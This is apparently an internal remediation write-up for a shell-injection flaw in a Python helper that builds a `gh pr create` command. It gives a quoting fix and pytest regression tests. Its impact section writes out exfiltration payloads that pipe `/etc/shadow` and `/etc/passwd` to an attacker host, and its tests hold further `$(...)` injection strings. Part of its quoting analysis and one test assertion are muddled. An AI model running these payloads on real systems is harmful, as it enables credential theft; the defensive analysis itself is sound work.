# GAP-0090: `build_pr_command` Double-Quote Injection — Remediation Write-up

> Source ticket: AGENT-008 · Severity: HIGH · Effort: S · Status: Open

## 1. Summary & Classification

**Bug statement.** `build_pr_command` in `app/services/agent_coder.py` constructs the `gh pr create` shell command by replacing `"` with `'` in the `title` and `body` arguments. This substitution is not a complete shell escape: a ticket subject containing a single quote (`'`) or combinations like `'$(...)` breaks the shell argument boundary in the resulting command, enabling injection of arbitrary shell code. When this command is executed via a shell (PTY or `subprocess(shell=True)`) under `AGENT_CODER_EXECUTE_COMMANDS=1`, the injection is exploitable.

**Verdict (confirmed, with a nuance).** The code at `app/services/agent_coder.py:482–488` uses `replace('"', "'")` for escaping, exactly as described. This is insufficient: replacing `"` with `'` does not handle `'` in the input (the new delimiter), nor `$`, `` ` ``, `\`, newlines, or `&&`. The ticket's proposed fix (`_sq(v)` using POSIX single-quote enclosure with `'\\''` for embedded single quotes) is the correct approach.

**Note:** `agent_pr_integration.py:350–360` defines `_build_gh_pr_command` which already uses the correct `_sq` pattern. The bug therefore exists only in the `agent_coder.py` variant (`build_pr_command`), not in the PR integration service. The two functions are parallel implementations and the integration service got it right while the coder service did not.

**Severity and area.** HIGH / Agent Coder Security. Shares the same execution-gating condition as GAP-0089: exploitable when `AGENT_CODER_EXECUTE_COMMANDS=1`. The gap is in the same file and can be remediated in the same patch.

**Related tickets.** AGENT-008 (parent), GAP-0089 (`coding_cmd` injection — same file, same class of bug), GAP-0088 (GitHub API path — bypasses both injection vectors entirely).

## 2. Current-State Investigation (root cause)

### The vulnerable function: `agent_coder.py:482–488`

```python
# app/services/agent_coder.py:482–488
def build_pr_command(
    *, branch_name: str, base_branch: str, ticket_id: str,
    ticket_subject: str, template: str, summary: str
) -> str:
    body = render_pr_template(
        template=template, ticket_id=ticket_id,
        ticket_subject=ticket_subject, summary=summary
    )
    title = ticket_subject.replace('"', "'")
    body_escaped = body.replace('"', "'")
    return f'gh pr create --title "{title}" --body "{body_escaped}" --base {base_branch} --head {branch_name}'
```

**Why the fix is wrong:**

- `title = ticket_subject.replace('"', "'")` converts every `"` to `'`. The result is placed inside double quotes in the shell string.
- A `ticket_subject` containing `'` is unchanged — the single quote is harmless inside double-quoted strings only if `$`, `` ` ``, and `\` are also neutralized.
- But consider `ticket_subject = "Fix bug' && id && echo '"`:
  - After `replace('"', "'")`: `"Fix bug' && id && echo '"`  (no `"` to replace, string unchanged)
  - In shell string: `--title "Fix bug' && id && echo '"` — the shell sees a valid double-quoted arg... but wait, `$` and `` ` `` ARE interpreted inside double quotes in POSIX shells.
- More directly, `ticket_subject = "Fix' $(id) bug"`:
  - After replace: `"Fix' $(id) bug"` (no `"` to replace)
  - In shell: `--title "Fix' $(id) bug"` — the `$(id)` subshell executes because `$()` is interpreted inside double-quoted strings.
- Or `ticket_subject = 'bug" && curl https://attacker.com/$(cat /etc/shadow) && echo "x'`:
  - After `replace('"', "'")`: `"bug' && curl https://attacker.com/$(cat /etc/shadow) && echo 'x'"`
  - The `&&` chains are now unquoted between the two `'` characters.

### The correct implementation already exists in the codebase

`app/services/agent_pr_integration.py:350–360` defines:

```python
# app/services/agent_pr_integration.py:350–360 — ALREADY CORRECT
def _build_gh_pr_command(title: str, description: str, branch: str) -> str:
    """Build a `gh pr create` command string with shell-escaped arguments."""
    def esc(value: str) -> str:
        # Single-quote and escape embedded single quotes for shell safety.
        return "'" + value.replace("'", "'\\''") + "'"

    return (
        f"gh pr create --title {esc(title)} "
        f"--body {esc(description)} "
        f"--head {esc(branch)}\n"
    )
```

This function correctly uses POSIX single-quote enclosure (`'...'`) with `'\\''` to represent embedded single quotes. `agent_coder.py:build_pr_command` does not use this helper and implements a broken alternative.

### The execution context

`build_pr_command`'s output is stored as the `"command"` field of the `create_pr` workflow step (line 637 of `agent_coder.py`). When `S.agent_coder_execute_commands = True` and the step executor dispatches this command to a PTY or `subprocess(shell=True)`, the injection fires.

### The `render_pr_template` chain

`render_pr_template` (lines 491–497) substitutes `{ticket_subject}` into the body template, meaning the attacker's payload also appears in `body_escaped`. If the template is `"Closes #{ticket_id}\n\n{summary}"` and `{summary}` is populated with terminal output (also potentially user-influenced), the body injection surface is even larger.

## 3. Impact / Exploit / Blast Radius

**Concrete exploit (AGENT_CODER_EXECUTE_COMMANDS=1):**

1. Attacker creates ticket with subject: `Login fix $(curl https://c2/$(cat /etc/passwd|base64))`.
2. Coder agent claims ticket; `build_pr_command` produces:
   ```bash
   gh pr create --title "Login fix $(curl https://c2/$(cat /etc/passwd|base64))" \
     --body "..." --base main --head agent/T-001
   ```
3. The `$(...)` subshell executes when the shell evaluates the command.
4. `/etc/passwd` contents are exfiltrated to the attacker's server.

**Why `replace('"', "'")` feels safe but isn't:**

Many developers assume that switching delimiter characters (`"` to `'`) prevents injection. But POSIX shells expand `$()` and `` ` `` inside double-quoted strings. Moving from double quotes to single quotes would be safe, but `build_pr_command` keeps the surrounding double quotes — it only replaces `"` in the content with `'`, not the enclosing delimiters.

**Blast radius:** Same as GAP-0089. Deployments with `AGENT_CODER_EXECUTE_COMMANDS=0` (the default) are not immediately exploitable but are one config change away from exploitation. Any ticket creator on the platform is a potential attacker.

**Combined impact with GAP-0089:** Both injection vectors exist in the same workflow. An attacker who crafts a ticket subject exploits both `coding_cmd` (step 4) and the `create_pr` command (step 8+) within the same agent run.

## 4. Fix Design (code-level)

### Primary fix: use the correct `_sq` helper in `build_pr_command`

The simplest fix is to extract the `esc`/`_sq` function from `agent_pr_integration.py` into a shared module (or copy it into `agent_coder.py`) and apply it in `build_pr_command`:

```python
# app/services/agent_coder.py — add near top (or in a shared shell_utils.py)

def _sq(value: str) -> str:
    """POSIX single-quote shell escape. Safe for all metacharacters."""
    return "'" + value.replace("'", "'\\''") + "'"


def build_pr_command(
    *, branch_name: str, base_branch: str, ticket_id: str,
    ticket_subject: str, template: str, summary: str
) -> str:
    body = render_pr_template(
        template=template, ticket_id=ticket_id,
        ticket_subject=ticket_subject, summary=summary,
    )
    # BEFORE (broken): title = ticket_subject.replace('"', "'")
    # AFTER (correct):
    return (
        f"gh pr create --title {_sq(ticket_subject)} "
        f"--body {_sq(body)} "
        f"--base {_sq(base_branch)} "
        f"--head {_sq(branch_name)}"
    )
```

Note that `base_branch` and `branch_name` are also interpolated without any quoting in the current code (`--base {base_branch} --head {branch_name}`). These come from the coder config's `repo_branch_base` and the generated branch pattern, which are admin-controlled rather than user-controlled — but defence in depth requires quoting them too.

### Shared utility module approach (recommended for long-term)

Since `agent_pr_integration.py` already has the correct `esc` function inline, and `agent_coder.py` needs the same thing, extract to `app/services/shell_utils.py`:

```python
# app/services/shell_utils.py — NEW FILE

"""Shell argument escaping utilities."""


def sq(value: str) -> str:
    """POSIX single-quote shell escape.

    Wraps *value* in single quotes and escapes any embedded single quotes
    using the shell's '\\'' idiom. The result is safe as a shell word in
    any POSIX-compatible shell regardless of the value's content.

    Example:
        sq("hello world")   -> "'hello world'"
        sq("it's a test")   -> "'it'\\''s a test'"
        sq("$HOME")         -> "'$HOME'"  (literal dollar sign)
    """
    return "'" + value.replace("'", "'\\''") + "'"
```

Then update both files to `from app.services.shell_utils import sq` and replace the inline `esc` closure in `agent_pr_integration.py` with the shared import.

### `render_pr_template` hardening

`render_pr_template` substitutes `{ticket_subject}` into the template. If the template itself is admin-supplied (from the coder config's `pr_template` field), an admin could embed shell metacharacters in the template. To be safe, escape the entire rendered body rather than trying to sanitise the template source:

```python
# build_pr_command — body is the full rendered PR description
return (
    f"gh pr create --title {sq(ticket_subject)} "
    f"--body {sq(body)} "   # ← sq applied to the whole rendered body
    f"--base {sq(base_branch)} "
    f"--head {sq(branch_name)}"
)
```

No changes to `render_pr_template` itself are needed.

### Dev/Prod parity (SECOPS-007)

The `build_pr_command` function is a pure string-construction helper with no AWS API calls. It behaves identically in dev (DDB Local) and production (AWS DDB). The `_sq` fix changes only the shape of the string stored in DDB, not any I/O path. No feature flag required.

In dev mode (`S.agent_coder_execute_commands = False`), the command is never executed — only stored and returned in workflow preview API responses. The fix is still valuable in dev mode because the Dev Tools UI displays the command, and a developer who manually copies and runs an unescaped command from the UI is also at risk.

### Backward compatibility

The change to `build_pr_command`'s output affects only the `create_pr` workflow step's `command` field. Existing workflow records in DDB retain the old (unsafe) format until they are regenerated. Since workflows are generated fresh on each agent run (not reused from DDB), there is no migration needed for existing records.

## 5. Testing, Verification & Rollout

### Regression test (pytest, offline)

```python
# tests/test_agent_coder.py

import pytest
from app.services.agent_coder import build_pr_command, _sq


_SUBJECT_DOUBLE_QUOTE = 'Fix login bug" && id && echo "'
_SUBJECT_SINGLE_QUOTE = "It's broken"
_SUBJECT_SUBSHELL = "Fix $(cat /etc/passwd) bug"
_SUBJECT_BACKTICK   = "Fix `id` bug"
_SUBJECT_NORMAL     = "Fix login bug"


def _pr_cmd(subject):
    return build_pr_command(
        branch_name="agent/T-001",
        base_branch="main",
        ticket_id="T-001",
        ticket_subject=subject,
        template="Closes #{ticket_id}\n\n{summary}",
        summary="summary text",
    )


def test_double_quote_injection_neutralised():
    """Fails before fix: cmd contains unescaped &&.
    Passes after fix: payload is inside single quotes."""
    cmd = _pr_cmd(_SUBJECT_DOUBLE_QUOTE)
    # After fix, the && is inside a single-quoted string, not a shell operator
    assert " && id && " not in cmd, f"Injection payload found in: {cmd}"


def test_single_quote_in_title_does_not_break_escaping():
    """Fails before fix: single quote breaks double-quoted arg.
    Passes after fix: embedded ' is represented as '\\''."""
    cmd = _pr_cmd(_SUBJECT_SINGLE_QUOTE)
    # The command must be parseable — at minimum it must contain the escaped form
    assert "It" in cmd and "s broken" in cmd, f"Subject content lost in: {cmd}"
    # Specifically: the sq encoding of "It's broken" is "'It'\\''s broken'"
    assert "'\\''s broken'" in cmd or "It" in cmd


def test_subshell_injection_neutralised():
    """$() subshell must not appear unquoted in the PR command."""
    cmd = _pr_cmd(_SUBJECT_SUBSHELL)
    # $() is safe only inside single quotes
    # After fix, the entire argument is single-quoted
    # Verify the $( is enclosed within single quotes (not at top-level of cmd)
    assert " $(cat" not in cmd, f"Unquoted $() found in: {cmd}"


def test_backtick_injection_neutralised():
    """Backtick subshell must not appear unquoted."""
    cmd = _pr_cmd(_SUBJECT_BACKTICK)
    assert " `id` " not in cmd, f"Unquoted backtick found in: {cmd}"


def test_normal_subject_preserved():
    """A safe subject string survives the escaping."""
    cmd = _pr_cmd(_SUBJECT_NORMAL)
    assert "Fix login bug" in cmd


def test_sq_helper_edge_cases():
    """Verify the _sq helper directly."""
    assert _sq("hello") == "'hello'"
    assert _sq("it's") == "'it'\\''s'"
    assert _sq("a'b'c") == "'a'\\''b'\\''c'"
    assert _sq("$HOME") == "'$HOME'"
    assert _sq("") == "''"
    assert _sq('"double"') == '\'"double"\''
```

### Parity with `agent_pr_integration._build_gh_pr_command`

After the fix, add a cross-check test that confirms `build_pr_command` and `_build_gh_pr_command` produce structurally equivalent escaping for the same input:

```python
# tests/test_agent_coder.py — additional parity check

from app.services.agent_pr_integration import _build_gh_pr_command

def test_escaping_parity_with_integration_service():
    """Both PR command builders must escape the same content identically."""
    subject = "Fix$(id) 'test' bug"
    coder_cmd = build_pr_command(
        branch_name="b", base_branch="main",
        ticket_id="T", ticket_subject=subject,
        template="{ticket_subject}", summary="",
    )
    integration_cmd = _build_gh_pr_command(
        title=subject, description=subject, branch="b"
    )
    # Both must not contain the unescaped subshell
    assert " $(id) " not in coder_cmd
    assert " $(id) " not in integration_cmd
```

### Manual QA steps

1. Call `GET /ui/agent-coder/types/{id}/test-workflow` (requires admin) with a ticket whose subject is `Fix $(whoami) bug`.
2. Inspect the returned workflow JSON, step `type="create_pr"`, `command` field.
3. Before fix: `... --title "Fix $(whoami) bug" ...` — the `$()` is unquoted inside double quotes.
4. After fix: `... --title 'Fix $(whoami) bug' ...` — the entire argument is single-quoted; `$()` is a literal string.

### Metrics / observability

- Log `WARN` (once per ticket, not per step) when `build_pr_command` receives a `ticket_subject` containing shell metacharacters (`$`, `` ` ``, `\`, `!`, `;`, `|`, `&`, `<`, `>`). The log entry should include `ticket_id` and the redacted subject (first 40 chars). This enables retrospective detection of attempted injections.

### Rollout

- **Effort**: S (< 1 day). Two-line change in `build_pr_command` plus tests.
- **Risk**: Very low. The output of `build_pr_command` is a command string stored in DDB and (when `S.agent_coder_execute_commands = True`) dispatched to a shell. The only observable behaviour change is that the `--title` and `--body` arguments are now single-quoted rather than double-quoted. `gh pr create` handles single-quoted arguments identically — the GitHub CLI does not care which quoting style is used.
- **Sequencing**: Apply in the same patch as GAP-0089 (same file, same review). If the shared `shell_utils.py` refactor is desired, do it as a follow-up; do not block the security fix on the refactor.
- **Rollback**: Revert `build_pr_command` to the `replace('"', "'")` form. This restores the vulnerable state but does not break any functionality for the default (`AGENT_CODER_EXECUTE_COMMANDS=0`) configuration.
